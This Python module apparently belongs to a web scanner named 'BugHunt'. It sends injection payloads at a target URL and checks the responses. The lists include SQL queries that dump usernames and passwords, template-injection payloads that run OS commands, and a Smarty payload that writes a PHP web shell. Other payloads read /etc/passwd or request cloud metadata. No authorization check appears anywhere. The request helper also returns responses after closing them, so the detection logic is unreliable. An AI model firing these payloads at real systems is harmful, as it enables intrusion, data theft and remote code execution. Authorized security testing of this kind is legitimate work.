"""
Advanced injection testing module for BugHunt.
Implements sophisticated injection attack techniques.
"""

import asyncio
import aiohttp
import json
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import logging
from datetime import datetime
import re
import base64
import urllib.parse


class InjectionTester:
    """Advanced injection testing class."""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.logger = logging.getLogger(__name__)
        self.injection_results = []
        
        # Advanced SQL injection payloads
        self.advanced_sql_payloads = {
            'union_based': [
                "' UNION SELECT NULL, NULL, NULL, NULL--",
                "' UNION SELECT 1, 2, 3, 4--",
                "' UNION SELECT username, password, NULL, NULL FROM users--",
                "' UNION SELECT table_name, column_name, NULL, NULL FROM information_schema.columns--",
                "' UNION SELECT user(), database(), version(), @@version_comment--"
            ],
            'boolean_based': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND (SELECT COUNT(*) FROM users)=0--",
                "' AND (SELECT LENGTH(username) FROM users LIMIT 1)>0--"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SELECT SLEEP(5)--",
                "'; pg_sleep(5)--",
                "'; (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ],
            'error_based': [
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x3a,0x3a,(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END)),0x3a,0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
            ]
        }
        
        # NoSQL injection payloads
        self.nosql_payloads = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "this.username == this.password"}',
            '{"$where": "function(){return true}"}',
            '{"$where": "this.username.match(/.*/)"}',
            '{"username": {"$ne": null}, "password": {"$ne": null}}',
            '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
        ]
        
        # LDAP injection payloads
        self.advanced_ldap_payloads = [
            '*',
            '*)(uid=*',
            '*)(|(uid=*',
            '*))(|(uid=*',
            '*))(|(objectClass=*',
            '*)(objectClass=*',
            '*)(|(objectClass=*',
            '*))(|(objectClass=*',
            '*)(|(objectClass=user)(objectClass=*))',
            '*)(|(uid=admin)(uid=*))',
            '*)(|(cn=admin)(cn=*))',
            '*)(|(mail=admin@*)(mail=*))'
        ]
        
        # XPATH injection payloads
        self.xpath_payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or name()='username' or 'x'='y",
            "x' or 'x'='y",
            "' or count(/)=0 or 'x'='y",
            "' or count(/*)=0 or 'x'='y",
            "' or count(/child::*)=0 or 'x'='y",
            "' or count(/descendant::*)=0 or 'x'='y",
            "' or count(/ancestor::*)=0 or 'x'='y",
            "' or count(/following::*)=0 or 'x'='y",
            "' or count(/preceding::*)=0 or 'x'='y",
            "' or count(/following-sibling::*)=0 or 'x'='y",
            "' or count(/preceding-sibling::*)=0 or 'x'='y"
        ]
        
        # Template injection payloads
        self.template_injection_payloads = {
            'jinja2': [
                '{{7*7}}',
                '{{config}}',
                '{{request}}',
                '{{self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
                '{{''.__class__.__mro__[2].__subclasses__()}}'
            ],
            'twig': [
                '{{7*7}}',
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
                '{{dump(app)}}',
                '{{app.request.server.all|join(\',\')}}'
            ],
            'smarty': [
                '{7*7}',
                '{php}echo `id`;{/php}',
                '{self::getStreamVariable("file:///proc/self/environ")}',
                '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]); ?>",self::clearConfig())}'
            ],
            'freemarker': [
                '${7*7}',
                '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
                '${"freemarker.template.utility.Execute"?new()("id")}',
                '${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("../../../etc/passwd").toURL().openStream().readAllBytes()?join(" ")}'
            ]
        }
        
        # Command injection payloads
        self.advanced_command_payloads = [
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '&& cat /etc/passwd',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            '; whoami',
            '| whoami',
            '&& whoami',
            '`whoami`',
            '$(whoami)',
            '; id',
            '| id',
            '&& id',
            '`id`',
            '$(id)',
            '; uname -a',
            '| uname -a',
            '&& uname -a',
            '`uname -a`',
            '$(uname -a)',
            '; ls -la',
            '| ls -la',
            '&& ls -la',
            '`ls -la`',
            '$(ls -la)',
            '; ping -c 1 127.0.0.1',
            '| ping -c 1 127.0.0.1',
            '&& ping -c 1 127.0.0.1',
            '`ping -c 1 127.0.0.1`',
            '$(ping -c 1 127.0.0.1)'
        ]
        
    async def __aenter__(self):
        """Async context manager entry."""
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
        )
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()
            
    async def run_comprehensive_tests(self) -> List[Dict]:
        """Run comprehensive injection tests."""
        print("💉 Starting comprehensive injection testing...")
        
        try:
            # Test different injection types
            await self._test_sql_injection()
            await self._test_nosql_injection()
            await self._test_ldap_injection()
            await self._test_xpath_injection()
            await self._test_template_injection()
            await self._test_command_injection()
            await self._test_xxe_injection()
            await self._test_ssrf_injection()
            
        except Exception as e:
            self.logger.error(f"Injection testing error: {str(e)}")
            
        return self.injection_results
        
    async def _test_sql_injection(self):
        """Test for SQL injection vulnerabilities."""
        print("🗄️ Testing SQL injection...")
        
        # Get parameters from URL
        parsed_url = urlparse(self.target_url)
        base_params = parse_qs(parsed_url.query)
        
        # Common parameter names
        param_names = list(base_params.keys()) if base_params else ['id', 'user', 'username', 'password', 'search', 'query']
        
        for param in param_names:
            # Test different SQL injection types
            for injection_type, payloads in self.advanced_sql_payloads.items():
                for payload in payloads[:2]:  # Limit to first 2 payloads per type
                    try:
                        # Test GET parameter
                        test_params = {param: payload}
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(test_params)}"
                        
                        response = await self._make_request(test_url)
                        if response:
                            await self._analyze_sql_response(response, param, payload, injection_type, 'GET')
                            
                        # Test POST parameter
                        response = await self._make_request(
                            self.target_url,
                            method='POST',
                            data={param: payload}
                        )
                        if response:
                            await self._analyze_sql_response(response, param, payload, injection_type, 'POST')
                            
                    except Exception as e:
                        self.logger.debug(f"SQL injection test error: {str(e)}")
                        
    async def _test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities."""
        print("🍃 Testing NoSQL injection...")
        
        # Common NoSQL parameters
        nosql_params = ['username', 'password', 'user', 'pass', 'email', 'login', 'auth']
        
        for param in nosql_params:
            for payload in self.nosql_payloads:
                try:
                    # Test JSON payload
                    json_data = {param: payload}
                    response = await self._make_request(
                        self.target_url,
                        method='POST',
                        json=json_data,
                        headers={'Content-Type': 'application/json'}
                    )
                    
                    if response:
                        await self._analyze_nosql_response(response, param, payload)
                        
                except Exception as e:
                    self.logger.debug(f"NoSQL injection test error: {str(e)}")
                    
    async def _test_ldap_injection(self):
        """Test for LDAP injection vulnerabilities."""
        print("🌳 Testing LDAP injection...")
        
        ldap_params = ['username', 'user', 'login', 'ldap', 'filter', 'search']
        
        for param in ldap_params:
            for payload in self.advanced_ldap_payloads:
                try:
                    # Test GET parameter
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = await self._make_request(test_url)
                    if response:
                        await self._analyze_ldap_response(response, param, payload, 'GET')
                        
                    # Test POST parameter
                    response = await self._make_request(
                        self.target_url,
                        method='POST',
                        data={param: payload}
                    )
                    if response:
                        await self._analyze_ldap_response(response, param, payload, 'POST')
                        
                except Exception as e:
                    self.logger.debug(f"LDAP injection test error: {str(e)}")
                    
    async def _test_xpath_injection(self):
        """Test for XPATH injection vulnerabilities."""
        print("📊 Testing XPATH injection...")
        
        xpath_params = ['search', 'query', 'filter', 'xpath', 'xml']
        
        for param in xpath_params:
            for payload in self.xpath_payloads:
                try:
                    # Test GET parameter
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = await self._make_request(test_url)
                    if response:
                        await self._analyze_xpath_response(response, param, payload, 'GET')
                        
                    # Test POST parameter
                    response = await self._make_request(
                        self.target_url,
                        method='POST',
                        data={param: payload}
                    )
                    if response:
                        await self._analyze_xpath_response(response, param, payload, 'POST')
                        
                except Exception as e:
                    self.logger.debug(f"XPATH injection test error: {str(e)}")
                    
    async def _test_template_injection(self):
        """Test for template injection vulnerabilities."""
        print("📝 Testing template injection...")
        
        template_params = ['template', 'view', 'page', 'content', 'message', 'name', 'search']
        
        for param in template_params:
            for template_type, payloads in self.template_injection_payloads.items():
                for payload in payloads:
                    try:
                        # Test GET parameter
                        test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                        
                        response = await self._make_request(test_url)
                        if response:
                            await self._analyze_template_response(response, param, payload, template_type, 'GET')
                            
                        # Test POST parameter
                        response = await self._make_request(
                            self.target_url,
                            method='POST',
                            data={param: payload}
                        )
                        if response:
                            await self._analyze_template_response(response, param, payload, template_type, 'POST')
                            
                    except Exception as e:
                        self.logger.debug(f"Template injection test error: {str(e)}")
                        
    async def _test_command_injection(self):
        """Test for command injection vulnerabilities."""
        print("⚡ Testing command injection...")
        
        cmd_params = ['cmd', 'command', 'exec', 'system', 'ping', 'host', 'ip', 'nslookup']
        
        for param in cmd_params:
            for payload in self.advanced_command_payloads[:5]:  # Limit to first 5 payloads
                try:
                    # Test GET parameter
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = await self._make_request(test_url)
                    if response:
                        await self._analyze_command_response(response, param, payload, 'GET')
                        
                    # Test POST parameter
                    response = await self._make_request(
                        self.target_url,
                        method='POST',
                        data={param: payload}
                    )
                    if response:
                        await self._analyze_command_response(response, param, payload, 'POST')
                        
                except Exception as e:
                    self.logger.debug(f"Command injection test error: {str(e)}")
                    
    async def _test_xxe_injection(self):
        """Test for XXE injection vulnerabilities."""
        print("📄 Testing XXE injection...")
        
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<root>&xxe;</root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///windows/system32/drivers/etc/hosts">
]>
<root>&xxe;</root>''',
            
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
]>
<root>&xxe;</root>'''
        ]
        
        for payload in xxe_payloads:
            try:
                response = await self._make_request(
                    self.target_url,
                    method='POST',
                    data=payload,
                    headers={'Content-Type': 'application/xml'}
                )
                
                if response:
                    await self._analyze_xxe_response(response, payload)
                    
            except Exception as e:
                self.logger.debug(f"XXE injection test error: {str(e)}")
                
    async def _test_ssrf_injection(self):
        """Test for SSRF injection vulnerabilities."""
        print("🌐 Testing SSRF injection...")
        
        ssrf_params = ['url', 'link', 'redirect', 'next', 'callback', 'proxy', 'fetch']
        ssrf_payloads = [
            'http://127.0.0.1:22',
            'http://localhost:80',
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'file:///etc/passwd',
            'file:///windows/system32/drivers/etc/hosts',
            'gopher://127.0.0.1:25',
            'dict://127.0.0.1:11211',
            'ldap://127.0.0.1:389',
            'http://[::1]:22',
            'http://0.0.0.0:22',
            'http://127.0.0.1:6379',
            'http://127.0.0.1:9200'
        ]
        
        for param in ssrf_params:
            for payload in ssrf_payloads:
                try:
                    # Test GET parameter
                    test_url = f"{self.target_url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = await self._make_request(test_url)
                    if response:
                        await self._analyze_ssrf_response(response, param, payload, 'GET')
                        
                    # Test POST parameter
                    response = await self._make_request(
                        self.target_url,
                        method='POST',
                        data={param: payload}
                    )
                    if response:
                        await self._analyze_ssrf_response(response, param, payload, 'POST')
                        
                except Exception as e:
                    self.logger.debug(f"SSRF injection test error: {str(e)}")
                    
    async def _analyze_sql_response(self, response, param: str, payload: str, injection_type: str, method: str):
        """Analyze SQL injection response."""
        try:
            content = await response.text()
            
            if self._detect_sql_error(content):
                self.injection_results.append({
                    'type': 'SQL Injection',
                    'severity': 'Critical',
                    'parameter': param,
                    'payload': payload,
                    'injection_type': injection_type,
                    'method': method,
                    'description': f'SQL injection detected via {injection_type} in parameter: {param}',
                    'confidence': 'High'
                })
                
            elif injection_type == 'time_based' and response.headers.get('Server-Timing'):
                # Check for timing-based indicators
                self.injection_results.append({
                    'type': 'SQL Injection (Time-based)',
                    'severity': 'Critical',
                    'parameter': param,
                    'payload': payload,
                    'injection_type': injection_type,
                    'method': method,
                    'description': f'Potential time-based SQL injection in parameter: {param}',
                    'confidence': 'Medium'
                })
                
        except Exception as e:
            self.logger.error(f"SQL response analysis error: {str(e)}")
            
    async def _analyze_nosql_response(self, response, param: str, payload: str):
        """Analyze NoSQL injection response."""
        try:
            content = await response.text()
            
            # Check for successful authentication or data access
            if response.status == 200 and ('admin' in content.lower() or 'dashboard' in content.lower()):
                self.injection_results.append({
                    'type': 'NoSQL Injection',
                    'severity': 'High',
                    'parameter': param,
                    'payload': payload,
                    'description': f'NoSQL injection detected in parameter: {param}',
                    'confidence': 'Medium'
                })
                
        except Exception as e:
            self.logger.error(f"NoSQL response analysis error: {str(e)}")
            
    async def _analyze_ldap_response(self, response, param: str, payload: str, method: str):
        """Analyze LDAP injection response."""
        try:
            content = await response.text()
            
            if self._detect_ldap_error(content):
                self.injection_results.append({
                    'type': 'LDAP Injection',
                    'severity': 'High',
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'description': f'LDAP injection detected in parameter: {param}',
                    'confidence': 'Medium'
                })
                
        except Exception as e:
            self.logger.error(f"LDAP response analysis error: {str(e)}")
            
    async def _analyze_xpath_response(self, response, param: str, payload: str, method: str):
        """Analyze XPATH injection response."""
        try:
            content = await response.text()
            
            if self._detect_xpath_error(content):
                self.injection_results.append({
                    'type': 'XPATH Injection',
                    'severity': 'High',
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'description': f'XPATH injection detected in parameter: {param}',
                    'confidence': 'Medium'
                })
                
        except Exception as e:
            self.logger.error(f"XPATH response analysis error: {str(e)}")
            
    async def _analyze_template_response(self, response, param: str, payload: str, template_type: str, method: str):
        """Analyze template injection response."""
        try:
            content = await response.text()
            
            if self._detect_template_execution(content, payload):
                self.injection_results.append({
                    'type': 'Template Injection',
                    'severity': 'High',
                    'parameter': param,
                    'payload': payload,
                    'template_type': template_type,
                    'method': method,
                    'description': f'{template_type} template injection detected in parameter: {param}',
                    'confidence': 'Medium'
                })
                
        except Exception as e:
            self.logger.error(f"Template response analysis error: {str(e)}")
            
    async def _analyze_command_response(self, response, param: str, payload: str, method: str):
        """Analyze command injection response."""
        try:
            content = await response.text()
            
            if self._detect_command_execution(content):
                self.injection_results.append({
                    'type': 'Command Injection',
                    'severity': 'Critical',
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'description': f'Command injection detected in parameter: {param}',
                    'confidence': 'High'
                })
                
        except Exception as e:
            self.logger.error(f"Command response analysis error: {str(e)}")
            
    async def _analyze_xxe_response(self, response, payload: str):
        """Analyze XXE injection response."""
        try:
            content = await response.text()
            
            if self._detect_file_content(content):
                self.injection_results.append({
                    'type': 'XML External Entity (XXE)',
                    'severity': 'High',
                    'payload': payload,
                    'description': 'XXE vulnerability detected - file content exposed',
                    'confidence': 'High'
                })
                
        except Exception as e:
            self.logger.error(f"XXE response analysis error: {str(e)}")
            
    async def _analyze_ssrf_response(self, response, param: str, payload: str, method: str):
        """Analyze SSRF injection response."""
        try:
            content = await response.text()
            
            if self._detect_ssrf_response(content):
                self.injection_results.append({
                    'type': 'Server-Side Request Forgery (SSRF)',
                    'severity': 'High',
                    'parameter': param,
                    'payload': payload,
                    'method': method,
                    'description': f'SSRF vulnerability detected in parameter: {param}',
                    'confidence': 'Medium'
                })
                
        except Exception as e:
            self.logger.error(f"SSRF response analysis error: {str(e)}")
            
    async def _make_request(self, url: str, method: str = 'GET', **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Make HTTP request with error handling."""
        try:
            async with self.session.request(method, url, **kwargs) as response:
                return response
        except Exception as e:
            self.logger.debug(f"Request failed for {url}: {str(e)}")
            return None
            
    def _detect_sql_error(self, content: str) -> bool:
        """Detect SQL error messages in response content."""
        sql_errors = [
            'mysql_fetch_array', 'mysql_fetch_assoc', 'mysql_fetch_row',
            'mysql_num_rows', 'mysql_query', 'ORA-01756',
            'Microsoft OLE DB Provider for SQL Server',
            'Microsoft JET Database Engine', 'SQLServer JDBC Driver',
            'PostgreSQL query failed', 'Warning: mysql_',
            'valid MySQL result', 'MySqlClient.', 'Npgsql.',
            'Warning: pg_', 'valid PostgreSQL result',
            'Warning: ibase_', 'valid Sybase result',
            'Sybase message', 'Sybase error', 'Sybase: Server message',
            'Microsoft OLE DB Provider for ODBC Drivers',
            'Microsoft OLE DB Provider for Oracle',
            'Microsoft VBScript runtime error',
            'ODBC SQL Server Driver', 'ODBC Microsoft Access',
            'Oracle error', 'Oracle driver', 'Oracle ODBC',
            'Oracle OLE', 'Oracle provider', 'Oracle ODBC Driver',
            'Oracle OLE DB', 'Oracle provider for OLE DB'
        ]
        
        content_lower = content.lower()
        return any(error.lower() in content_lower for error in sql_errors)
        
    def _detect_ldap_error(self, content: str) -> bool:
        """Detect LDAP error messages."""
        ldap_errors = [
            'ldap_bind', 'Invalid DN syntax', 'LDAP error',
            'ldap_search', 'ldap_connect'
        ]
        
        content_lower = content.lower()
        return any(error.lower() in content_lower for error in ldap_errors)
        
    def _detect_xpath_error(self, content: str) -> bool:
        """Detect XPATH error messages."""
        xpath_errors = [
            'xpath error', 'xpath exception', 'xpath syntax error',
            'invalid xpath', 'xpath parsing error'
        ]
        
        content_lower = content.lower()
        return any(error.lower() in content_lower for error in xpath_errors)
        
    def _detect_template_execution(self, content: str, payload: str) -> bool:
        """Detect template execution."""
        # Check if mathematical expression was evaluated
        if payload == '{{7*7}}' and '49' in content:
            return True
        if payload == '{7*7}' and '49' in content:
            return True
        if payload == '${7*7}' and '49' in content:
            return True
            
        # Check for other template indicators
        template_indicators = [
            'config', 'request', 'self', 'builtins', 'globals'
        ]
        
        return any(indicator in content.lower() for indicator in template_indicators)
        
    def _detect_command_execution(self, content: str) -> bool:
        """Detect command execution in response."""
        cmd_indicators = [
            'uid=', 'gid=', 'groups=', 'total ', 'drwx',
            'Volume Serial Number', 'Directory of', 'Volume in drive',
            'PING', 'ping statistics', 'packets transmitted'
        ]
        
        return any(indicator in content for indicator in cmd_indicators)
        
    def _detect_file_content(self, content: str) -> bool:
        """Detect file system content in response."""
        file_indicators = [
            'root:x:0:0:', '[boot loader]', 'Microsoft Windows',
            '/bin/bash', 'localhost', '127.0.0.1'
        ]
        
        return any(indicator in content for indicator in file_indicators)
        
    def _detect_ssrf_response(self, content: str) -> bool:
        """Detect SSRF response patterns."""
        ssrf_indicators = [
            'SSH-2.0', 'HTTP/1.1', 'FTP', 'SSH',
            'Connection refused', 'Connection timed out',
            'PING', 'ping statistics', 'packets transmitted'
        ]
        
        return any(indicator in content for indicator in ssrf_indicators)
